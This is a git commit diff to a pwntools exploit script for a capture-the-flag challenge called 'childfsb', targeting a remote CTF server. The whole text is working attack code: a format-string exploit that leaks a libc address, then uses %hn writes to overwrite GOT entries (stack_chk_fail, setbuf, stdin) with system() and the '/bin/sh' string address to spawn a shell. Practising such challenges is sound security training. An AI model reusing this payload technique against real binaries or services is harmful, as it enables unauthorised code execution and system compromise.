7ff638e80376948c1cb6257a8faeb918054b839d
synod2 <synod2@naver.com>
2020-02-29 11:59:43 +0000

    0229_desktop

--- childfsb/ex2.py
+++ childfsb/ex2.py
@@ -3,11 +3,13 @@ from pwn import *
 #p = process("./childfsb")
 p = remote("ctf.j0n9hyun.xyz",3037)
 
-one = [0x45216,0x4526a,0xf02a4,0xf1147]
+binsh_offset = 0x18cd57
+system_offset = 0x45390
 
 offset = 0x20830
 chk_got = 0x601020
 ret = 0x0400780
+
 setbuf_got = 0x601028
 stdin_got = 0x601070 
 
@@ -24,37 +26,35 @@ p.sendlineafter("hello",payload) #overwrite stack_chk_fail's GOT -> main
 
 payload2 = "%12$lx  "
 payload2 += "a"*16
-
+pause()
 p.sendlineafter("hello",payload2)
 p.recvline()
 
 leak = int(p.recv(12),16)
 libc = leak-offset
-one_gadget = ["",0,0]
-one_gadget[0] = hex(libc+one[0])
-one_gadget[1] = int(one_gadget[0][6:10],16)
-one_gadget[2] = int(one_gadget[0][10:14],16)
+system = ["",0,0]
+system[0] = hex(libc+system_offset)
+system[1] = int(system[0][6:10],16)
+system[2] = int(system[0][10:14],16)
 
 log.info(hex(libc))
 
 # ---- overwrite setbuf's GOT last 4byte ---- 
 
-pstr = "%"+str(one_gadget[2]-1)+"c"
+pstr = "%"+str(system[2]-1)+"c"
 
 payload3 = pstr+" "*(8-len(pstr))
 payload3 += "%10$hn  "
 payload3 += p64(setbuf_got)
 
-
-
 p.sendlineafter("hello",payload3)
 
-for i in range(0,one_gadget[2]/1024) : 
+for i in range(0,system[2]/1024) : 
     p.recv(1024)
 
 # ---- overwrite setbuf's GOT first 4byte ---- 
 
-pstr = "%"+str(one_gadget[1]-1)+"c"
+pstr = "%"+str(system[1]-1)+"c"
 
 payload3 = pstr+" "*(8-len(pstr))
 payload3 += "%11$hn  "
@@ -62,22 +62,48 @@ payload3 += p64(setbuf_got+2)
 
 p.sendlineafter("hello",payload3)
 
-for i in range(0,one_gadget[1]/1024) : 
+for i in range(0,system[1]/1024) : 
     p.recv(1024)
     
-# ---- overwrite stdin's GOT ---- 
+# ============================================
+    
+# ---- overwrite stdin's GOT last 4byte ---- 
 
-payload3 = "%11$ln  "
+binsh = ["",0,0]
+binsh[0] = hex(libc+binsh_offset)
+binsh[1] = int(binsh[0][6:10],16)
+binsh[2] = int(binsh[0][10:14],16)
+
+pstr = "%"+str(binsh[2]-1)+"c"
+
+payload3 = pstr+" "*(8-len(pstr))
+payload3 += "%12$hn  "
 payload3 += p64(stdin_got)
 
 p.sendlineafter("hello",payload3)
 
-log.info(one_gadget) 
- 
+for i in range(0,binsh[2]/1024) : 
+    p.recv(1024)
+
+# ---- overwrite stdin's GOT first 4byte ---- 
+
+pstr = "%"+str(binsh[1]-1)+"c"
+
+payload3 = pstr+" "*(8-len(pstr))
+payload3 += "%13$hn  "
+payload3 += p64(stdin_got+2)
+
+p.sendlineafter("hello",payload3)
+
+for i in range(0,binsh[1]/1024) : 
+    p.recv(1024)
+
+# ============================================
+
 #---- return to init ----
  
-payload = "%1828c  " #offset - 2 
-payload += "%13$hn  "
+payload = "%1885c  " #offset - 2 
+payload += "%14$hn  "
 payload += p64(chk_got)
 
 #pause()
